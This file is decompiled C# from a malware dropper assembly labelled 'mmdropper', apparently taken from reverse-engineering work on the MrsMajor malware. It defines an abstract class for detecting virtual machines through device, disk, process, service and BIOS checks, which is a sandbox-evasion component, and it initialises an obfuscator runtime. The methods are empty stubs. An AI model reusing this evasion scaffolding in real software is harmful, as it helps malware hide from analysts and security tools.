// Decompiled with JetBrains decompiler
// Type: BaseVirtualEnvironment
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\AgileStringDecryptor-master\bin\Debug\net48\eulascr-Utf8Fixed.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

internal abstract class BaseVirtualEnvironment : IVirtualEnvironment
{
  public abstract string Name { [MethodImpl(MethodImplOptions.NoInlining)] get; }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool ContainsDevice(IEnumerable<PnPEntity> devices) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool ContainsDisk(IEnumerable<DiskDrive> disks) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool ContainsProcess(IEnumerable<string> processes) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool ContainsService(IEnumerable<WindowsService> services) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool IsVirtual(BIOS bios) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool IsVirtual(ComputerSystem computer) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public virtual bool Assert(
    ComputerSystem computer,
    BIOS bios,
    IEnumerable<DiskDrive> disks,
    IEnumerable<PnPEntity> devices,
    IEnumerable<string> processes,
    IEnumerable<WindowsService> services)
  {
    return false;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected BaseVirtualEnvironment()
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static BaseVirtualEnvironment()
  {
    AgileDotNetRT.Initialize();
    AgileDotNetRT.PostInitialize();
  }
}
